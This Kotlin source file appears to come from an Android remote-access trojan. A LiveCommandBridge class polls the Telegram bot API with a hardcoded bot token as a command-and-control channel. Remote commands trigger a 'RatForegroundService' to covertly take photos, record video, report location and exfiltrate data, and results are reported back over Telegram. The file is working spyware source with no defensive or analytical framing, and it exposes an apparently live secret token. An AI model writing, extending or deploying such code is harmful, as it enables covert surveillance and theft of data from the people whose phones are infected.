package com.mzkyzak.appbug

import android.content.Context
import android.util.Log
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class LiveCommandBridge(private val context: Context, private val c2Client: TelegramC2Client) {
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()
    private var webSocket: WebSocket? = null
    private val BOT_TOKEN = "8898141962:AAHK5OWEo5UFNWGszehi97U8ZQSdPSyXEns"

    fun startLiveBridge() {
        // Polling Telegram getUpdates as a real-time command bridge
        val thread = Thread {
            var lastUpdateId = 0L
            while (true) {
                try {
                    val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val request = Request.Builder().url(url).build()
                    val response = client.newCall(request).execute()
                    val body = response.body?.string()
                    if (body != null) {
                        val json = JSONObject(body)
                        val result = json.getJSONArray("result")
                        for (i in 0 until result.length()) {
                            val update = result.getJSONObject(i)
                            lastUpdateId = update.getLong("update_id")
                            if (update.has("message")) {
                                val msg = update.getJSONObject("message")
                                val text = msg.optString("text", "")
                                handleRemoteCommand(text)
                            }
                        }
                    }
                    response.close()
                } catch (e: Exception) {
                    Log.e("LiveBridge", "Poll failed: ${e.message}")
                    Thread.sleep(5000)
                }
            }
        }
        thread.name = "LiveCommandBridge"
        thread.start()
    }

    private fun handleRemoteCommand(command: String) {
        val intent = android.content.Intent(context, RatForegroundService::class.java)
        when (command.lowercase()) {
            "recon" -> intent.action = "ACTION_BRUTAL_EXFIL"
            "photo" -> intent.action = "ACTION_LIVE_PHOTO"
            "video" -> intent.action = "ACTION_RECORD_VIDEO"
            "location" -> intent.action = "ACTION_REPORT_LOCATION"
            "exfil" -> intent.action = "ACTION_RUN_EXFIL"
            else -> return
        }
        context.startService(intent)
        c2Client.sendMessage("<b>[Remote]</b> Executing: $command")
    }
}
